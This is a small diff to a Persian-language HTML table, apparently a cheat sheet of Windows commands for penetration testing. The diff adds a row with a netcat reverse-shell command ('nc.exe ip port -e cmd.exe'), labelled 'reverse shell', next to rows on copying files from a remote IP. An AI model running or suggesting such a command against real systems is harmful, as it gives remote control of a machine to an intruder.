@@ -272,6 +272,10 @@ published: true
       <td style="text-align:left">کپی فایل از ip به سیستم جاری توسط cmd.exe</td>
     </tr>
     <tr>
+      <td style="text-align:left">cmd.exe /c c:/windows/temp/nc.exe ip port -e cmd.exe</td>
+      <td style="text-align:left">شل reverse</td>
+    </tr>
+    <tr>
       <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
       <td style="text-align:left">کپی از فودر ip</td>
     </tr>
